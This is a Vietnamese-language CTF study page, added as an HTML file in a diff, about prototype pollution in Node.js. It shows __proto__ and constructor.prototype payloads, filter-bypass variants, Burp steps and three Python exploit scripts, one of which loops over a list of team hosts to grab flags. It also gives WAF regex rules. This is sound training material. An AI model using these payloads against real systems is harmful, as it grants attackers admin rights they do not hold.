@@ -1,0 +1,501 @@
+<title>Prototype Pollution — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · Node.js đặc thù</div>
+    <h1>Prototype Pollution</h1>
+    <p class="sub">Đặc thù JavaScript/Node.js: khi app "trộn" (merge) object từ input người dùng vào object nội
+    bộ không cẩn thận, bạn có thể thêm 1 thuộc tính đặc biệt tên <code>__proto__</code> — không chỉ sửa 1 object,
+    mà sửa <strong>khuôn mẫu chung</strong> mà MỌI object cùng loại trong chương trình kế thừa theo.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Prototype Pollution là gì, để làm gì?</h2>
+  <p class="lead">Trong JavaScript, mọi object (trừ trường hợp đặc biệt) đều có 1 "khuôn mẫu cha" chung tên
+  <code>Object.prototype</code> — mọi thuộc tính thêm vào khuôn mẫu này sẽ <strong>tự động xuất hiện trên MỌI
+  object khác</strong> trong toàn bộ chương trình, kể cả object được tạo ra SAU đó, ở chỗ code hoàn toàn khác.
+  Nếu app dùng hàm "merge object sâu" (deep merge) không cẩn thận với input người dùng, bạn gửi key đặc biệt
+  <code>__proto__</code> để "chui" vào tận khuôn mẫu gốc này, thêm thuộc tính (vd <code>isAdmin: true</code>) ảnh
+  hưởng tới MỌI object <code>{}</code> trong toàn chương trình, dù chưa từng tồn tại lúc bạn gửi request.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Khác Mass Assignment (chỉ ảnh hưởng 1 object/bản ghi cụ thể), Prototype Pollution ảnh hưởng
+  <strong>TOÀN BỘ chương trình</strong> — mọi object trống <code>{}</code> được tạo SAU thời điểm bạn ô nhiễm
+  cũng tự nhiên "thừa kế" field độc đó, kể cả ở phần code hoàn toàn không liên quan tới nơi bạn gửi payload.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ PROTOTYPE POLLUTION</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Backend Node.js (cookie <code>connect.sid</code>), có endpoint nhận JSON lồng nhau (merge settings,
+        update profile sâu nhiều cấp) — đặc biệt nếu thấy dùng thư viện <code>lodash.merge</code>/<code>deepmerge</code>/<code>_.merge()</code>.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        App dùng hàm merge/extend sâu (deep merge), nhận object từ request chưa lọc key <code>__proto__</code>/<code>constructor</code>.
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh bằng Burp</span>
+        Gửi <code>{"__proto__": {"polluted": "yes"}}</code> vào bất kỳ endpoint merge nào, sau đó gọi 1 endpoint
+        KHÁC tạo object mới, xem có field <code>polluted</code> tự xuất hiện không (dù endpoint đó chưa từng
+        nhận field này).
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay</span>
+<pre><code><span class="c">// 1. Ô nhiễm qua endpoint merge bất kỳ</span>
+{"__proto__": {"isAdmin": true}}
+
+<span class="c">// 2. Nếu __proto__ bị lọc, thử qua constructor.prototype</span>
+{"constructor": {"prototype": {"isAdmin": true}}}
+
+<span class="c">// 3. Qua query string (một số parser qs của Express hiểu được)</span>
+?__proto__[isAdmin]=true</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> requests
+
+<span class="c"># Bước 1: gửi payload ô nhiễm qua endpoint merge bất kỳ (vd update settings)</span>
+requests.post(<span class="s">"http://TARGET/settings"</span>, json={<span class="s">"__proto__"</span>: {<span class="s">"isAdmin"</span>: <span class="k">True</span>}})
+
+<span class="c"># Bước 2: gọi endpoint khác, vốn tạo object user MỚI -- giờ tự "thừa kế" isAdmin=true</span>
+r = requests.get(<span class="s">"http://TARGET/admin"</span>)
+<span class="k">print</span>(r.text)</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Pollution chỉ tồn tại trong process đang chạy (không lưu DB) — có thể bị mất nếu server restart giữa
+        chừng. WAF rule nhanh: chặn regex <code>__proto__|constructor.*prototype</code> trong JSON body. Chưa
+        hiểu? đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>Prototype (khuôn mẫu)</b> — trong JavaScript, mỗi object có 1 "object cha" nó tự động tham
+  chiếu tới để tìm thuộc tính/hàm khi không tìm thấy trên chính nó. Mặc định, mọi object literal (<code>{}</code>)
+  đều có cha chung là <code>Object.prototype</code>.</div>
+  <div class="def"><b><code>__proto__</code></b> — thuộc tính đặc biệt (accessor) cho phép truy cập/SỬA trực
+  tiếp vào prototype của 1 object — đây chính là "cửa sau" bị lợi dụng: viết vào
+  <code>obj.__proto__.x = 1</code> tương đương sửa <code>Object.prototype.x = 1</code>, ảnh hưởng MỌI object.</div>
+  <div class="def"><b>Deep merge</b> — hàm trộn 2 object <strong>đệ quy</strong> (merge cả các object lồng bên
+  trong, không chỉ cấp ngoài cùng) — các thư viện phổ biến: <code>_.merge()</code> (lodash), <code>deepmerge</code>,
+  hoặc code tự viết đệ quy. Nếu hàm này không chặn key <code>__proto__</code>, nó sẽ đệ quy luôn cả vào prototype
+  thật.</div>
+  <p>Code hay viết (deep merge tự viết, thiếu chặn key nguy hiểm):</p>
+  <pre><code><span class="c">// Node.js</span>
+<span class="k">function</span> merge(target, source) {
+  <span class="k">for</span> (<span class="k">const</span> key <span class="k">in</span> source) {
+    <span class="k">if</span> (<span class="k">typeof</span> source[key] === <span class="s">'object'</span>) {
+      target[key] = target[key] || {};
+      merge(target[key], source[key]);   <span class="c">// !! không check key === '__proto__'</span>
+    } <span class="k">else</span> {
+      target[key] = source[key];
+    }
+  }
+}
+merge({}, req.body);   <span class="c">// req.body = {"__proto__": {"isAdmin": true}} -&gt; ô nhiễm!</span></code></pre>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>JavaScript không phân biệt "key dữ liệu thường" với "key điều khiển ngôn ngữ"</h2>
+  <p>Với hầu hết key (<code>"name"</code>, <code>"age"</code>), vòng lặp <code>for...in</code> chỉ đơn giản đọc/
+  ghi giá trị như dữ liệu thường. Nhưng <code>__proto__</code> và <code>constructor.prototype</code> là
+  <strong>key đặc biệt có ý nghĩa với chính ngôn ngữ JavaScript</strong> — viết vào chúng không tạo ra 1 "field
+  dữ liệu tên __proto__" như mong đợi, mà thực sự thay đổi cơ chế kế thừa object. Hàm merge đệ quy tự viết (hoặc
+  thư viện cũ chưa vá) coi mọi key như nhau, không có bước lọc ra những key "đặc biệt" này trước khi gán.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Từ 1 request tới ảnh hưởng TOÀN CHƯƠNG TRÌNH</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 210" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr19)}
+    </style>
+    <defs><marker id="arr19" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="10" y="20" width="210" height="55" rx="10" class="box-a"/>
+    <text x="22" y="40" class="lbl-m">POST /settings</text>
+    <text x="22" y="56" class="lbl-a">{"__proto__":{"isAdmin":true}}</text>
+
+    <path d="M220,48 H258" class="arrow"/>
+    <rect x="263" y="20" width="195" height="55" rx="10" class="box"/>
+    <text x="275" y="40" class="lbl-m">merge() đệ quy đi vào</text>
+    <text x="275" y="56" class="lbl-a">Object.prototype.isAdmin = true</text>
+
+    <path d="M360,80 V105" class="arrow"/>
+    <rect x="263" y="110" width="195" height="55" rx="10" class="box-a"/>
+    <text x="275" y="130" class="lbl-m">MỌI object {} sau đó</text>
+    <text x="275" y="146" class="lbl-a">tự có .isAdmin = true</text>
+
+    <path d="M263,135 H90" class="arrow"/>
+    <rect x="10" y="110" width="200" height="55" rx="10" class="box-a"/>
+    <text x="22" y="130" class="lbl-m">GET /admin (route KHÁC)</text>
+    <text x="22" y="146" class="lbl-a">if (user.isAdmin) -&gt; TRUE!</text>
+  </svg>
+  </div>
+  <p>Điểm đặc biệt quan trọng: <code>GET /admin</code> ở ví dụ trên có thể nằm ở <strong>file code hoàn toàn
+  khác</strong>, viết bởi người khác, không hề biết tới endpoint <code>/settings</code> — nhưng vì
+  <code>user.isAdmin</code> được JavaScript tự động "tra cứu lên" tới <code>Object.prototype</code> khi không
+  tìm thấy trực tiếp trên object <code>user</code>, nó vẫn nhận được giá trị <code>true</code> đã bị ô nhiễm.</p>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Bảng dấu hiệu</h2>
+  <table>
+    <tr><th>Dấu hiệu quan sát được</th><th>Ý nghĩa</th></tr>
+    <tr><td>Backend Node.js + endpoint nhận JSON object lồng nhau (settings, profile nhiều cấp)</td><td>Bề mặt deep merge kinh điển</td></tr>
+    <tr><td>App dùng thư viện merge cũ (<code>lodash</code> bản &lt;4.17.19, <code>deepmerge</code> bản cũ)</td><td>Nhiều CVE prototype pollution đã công bố cho các bản cũ này</td></tr>
+    <tr><td>Có logic kiểm tra quyền kiểu <code>if (user.isAdmin)</code> mà không khởi tạo field này rõ ràng</td><td>Dễ bị "thừa kế" giá trị độc nếu field không tồn tại trực tiếp trên object</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">2 bước tách rời: ô nhiễm rồi kiểm tra ở chỗ khác</span>
+  <ol style="margin:4px 0 0">
+    <li>Bắt request tới endpoint merge (vd update settings), Send to Repeater.</li>
+    <li>Sửa body thành <code>{"__proto__": {"polluted_test_123": "yes"}}</code>, Send.</li>
+    <li>Mở tab Repeater MỚI cho 1 endpoint hoàn toàn khác (vd trang chủ, hoặc endpoint trả về info user) — thêm
+    debug nếu có cách xem toàn bộ thuộc tính object, hoặc gọi thẳng endpoint nhạy cảm (<code>/admin</code>) để
+    xem có "qua cửa" được không.</li>
+  </ol>
+  <strong>Lưu ý:</strong> không thể "nhìn thấy" trực tiếp pollution qua response của chính request (1) — phải
+  thử gián tiếp qua hành vi ở request (2)/(3).</div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD ĐẦY ĐỦ THEO BIẾN THỂ</div>
+  <h2>Các đường vào khi <code>__proto__</code> bị lọc</h2>
+  <table>
+    <tr><th>Bị chặn</th><th>Cách né</th></tr>
+    <tr><td>Lọc đúng chuỗi <code>__proto__</code></td><td>Dùng <code>constructor.prototype</code> — cách khác để tới cùng đích: <code>{"constructor": {"prototype": {"isAdmin": true}}}</code></td></tr>
+    <tr><td>Chỉ lọc ở cấp JSON ngoài cùng</td><td>Lồng sâu hơn: <code>{"a": {"__proto__": {"isAdmin": true}}}</code> nếu hàm merge đệ quy không lọc ở MỌI cấp, chỉ cấp đầu</td></tr>
+    <tr><td>Gửi qua body JSON bị chặn hoàn toàn</td><td>Thử qua query string nếu dùng thư viện <code>qs</code> (Express mặc định với <code>extended: true</code>): <code>?__proto__[isAdmin]=true</code></td></tr>
+  </table>
+
+  <h3>Client-side Prototype Pollution (biến thể khác, trong trình duyệt)</h3>
+  <p>Tương tự nhưng xảy ra ở JavaScript <strong>phía client</strong> (code chạy trong trình duyệt), qua URL
+  params hoặc JSON parse không an toàn — ô nhiễm prototype rồi tìm "gadget" (đoạn code sẵn có dùng property bị ô
+  nhiễm) để dẫn tới DOM XSS. Phức tạp hơn, cần phân tích code JS phía client cụ thể của từng app để tìm gadget
+  phù hợp — không có công thức chung.</p>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: KHO PAYLOAD</div>
+  <h2>Tham khảo payload theo từng thư viện merge cụ thể</h2>
+  <p><code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Prototype Pollution/</code> — payload mẫu theo từng thư viện
+  (lodash, jQuery extend, hoanglong...) và cả phần client-side gadget cho các framework JS phổ biến.</p>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+
+base = <span class="s">"http://TARGET"</span>
+
+<span class="c"># Bước 1: ô nhiễm prototype qua endpoint merge</span>
+requests.post(<span class="s">f"{base}/settings"</span>, json={<span class="s">"__proto__"</span>: {<span class="s">"isAdmin"</span>: <span class="k">True</span>}})
+
+<span class="c"># Bước 2: gọi endpoint khác để kiểm tra ảnh hưởng</span>
+r = requests.get(<span class="s">f"{base}/admin"</span>)
+<span class="k">print</span>(r.status_code, r.text[:200])</code></pre>
+
+  <h3>(B) Bản gọn chắc — thử cả 2 biến thể (__proto__/constructor), trích thẳng flag</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+PAYLOADS = [
+    {<span class="s">"__proto__"</span>: {<span class="s">"isAdmin"</span>: <span class="k">True</span>}},
+    {<span class="s">"constructor"</span>: {<span class="s">"prototype"</span>: {<span class="s">"isAdmin"</span>: <span class="k">True</span>}}},
+]
+
+<span class="k">def</span> <span class="d">exploit_pp</span>(host):
+    <span class="k">for</span> payload <span class="k">in</span> PAYLOADS:
+        requests.post(<span class="s">f"http://{host}/settings"</span>, json=payload, timeout=5)
+        r = requests.get(<span class="s">f"http://{host}/admin"</span>, timeout=5)
+        m = FLAG_RE.search(r.text)
+        <span class="k">if</span> m:
+            <span class="k">return</span> m.group()
+    <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">print</span>(<span class="s">"FLAG:"</span>, exploit_pp(<span class="s">"TARGET_IP"</span>))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy mọi đội, mọi round</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+PAYLOAD = {<span class="s">"__proto__"</span>: {<span class="s">"isAdmin"</span>: <span class="k">True</span>}}   <span class="c"># đã xác nhận ăn từ bước thử tay</span>
+
+<span class="k">def</span> <span class="d">exploit_pp</span>(host):
+    <span class="k">try</span>:
+        requests.post(<span class="s">f"http://{host}/settings"</span>, json=PAYLOAD, timeout=5)
+        r = requests.get(<span class="s">f"http://{host}/admin"</span>, timeout=5)
+        m = FLAG_RE.search(r.text)
+        <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        flag = exploit_pp(host)
+        <span class="k">if</span> flag:
+            <span class="k">print</span>(<span class="s">f"{host} {flag}"</span>)
+            <span class="k">with</span> open(<span class="s">"flags.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+                f.write(<span class="s">f"{flag}\n"</span>)</code></pre>
+  <div class="note tip"><span class="tag">Lưu ý quan trọng cho A/D</span>Pollution tồn tại trong RAM của process
+  server — nếu service tự restart (vd BTC reset đầu round, hoặc crash tự hồi phục), ô nhiễm MẤT và phải gửi lại
+  payload (1) trước khi gọi (2) mỗi lần — script (C) đã làm đúng thứ tự này mỗi lần chạy.</div>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Service Node.js, có endpoint <code>/profile/update</code> nhận JSON, merge sâu vào object user hiện tại.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Thử ô nhiễm</div><div class="d">Gửi <code>{"__proto__": {"isAdmin": true}}</code> tới <code>/profile/update</code>.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Kiểm tra ảnh hưởng</div><div class="d">Gọi <code>/admin</code> (route kiểm tra <code>if (req.user.isAdmin)</code>) → Response hiện trang admin thay vì 403 ⟹ xác nhận pollution thành công.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Lấy flag</div><div class="d">Trang admin hiện <code>FHACKER2026{...}</code>.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Tự động hóa</div><div class="d">Dùng script (C) mục 08, gửi lại payload mỗi lần round reset.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Chặn đúng payload, không chặn nhầm request thường</h2>
+  <table>
+    <tr><th>Rule (regex, soi body JSON)</th><th>Khớp gì</th></tr>
+    <tr><td><code>"__proto__"\s*:</code></td><td>Key <code>__proto__</code> xuất hiện trong JSON body — hiếm khi là nhu cầu hợp lệ của request thường</td></tr>
+    <tr><td><code>"constructor"\s*:\s*\{\s*"prototype"</code></td><td>Biến thể qua constructor.prototype</td></tr>
+  </table>
+  <div class="note warn"><span class="tag">Rủi ro chặn nhầm thấp</span>Khác IDOR/Race Condition, key
+  <code>__proto__</code> gần như KHÔNG BAO GIỜ là dữ liệu hợp lệ của người dùng bình thường — đây là 1 trong các
+  rule an toàn để chặn sớm, rủi ro thấp.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi payload không ăn</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Gửi payload không lỗi nhưng endpoint khác không bị ảnh hưởng</td><td>App dùng <code>Object.create(null)</code> hoặc <code>Map</code> thay vì object literal cho dữ liệu nhạy cảm — không có prototype để ô nhiễm</td><td>Kiểm tra app có dùng cấu trúc dữ liệu khác, không phải object thường — nếu vậy không khai thác được qua kỹ thuật này</td></tr>
+    <tr><td>Node.js báo lỗi/crash khi gửi <code>__proto__</code></td><td>Bản Node.js mới (≥16) đã có bảo vệ 1 phần với <code>__proto__</code> ở 1 số API, hoặc thư viện merge đã vá CVE</td><td>Thử biến thể <code>constructor.prototype</code> (mục 06) thay vì <code>__proto__</code> trực tiếp</td></tr>
+    <tr><td>Pollution thành công nhưng route kiểm tra quyền không bị ảnh hưởng</td><td>Route đó check field KHÁC tên với field bạn đã ô nhiễm, hoặc dùng <code>hasOwnProperty()</code> (chỉ check thuộc tính TRỰC TIẾP trên object, bỏ qua prototype)</td><td>Tìm đúng tên field route thật sự check (đọc source nếu có), hoặc chuyển hướng lỗ hổng khác nếu app dùng <code>hasOwnProperty</code> nhất quán</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>App Node.js dùng deep merge tự viết hoặc thư viện cũ chưa vá, không lọc key <code>__proto__</code>/<code>constructor</code>, VÀ có route khác đọc field qua <code>obj.field</code> (không dùng <code>hasOwnProperty</code>).</td></tr>
+    <tr><td>❌</td><td>App dùng <code>hasOwnProperty()</code> nhất quán khi check field quan trọng — bỏ qua hoàn toàn giá trị "thừa kế" từ prototype.</td></tr>
+    <tr><td>❌</td><td>Thư viện merge đã vá (lodash ≥4.17.21, hoặc tự thêm check <code>key === '__proto__'</code> trong code đệ quy).</td></tr>
+    <tr><td>❌</td><td>Ngôn ngữ khác JavaScript — khái niệm prototype chain không tồn tại ở Python/PHP/Java theo cách này.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
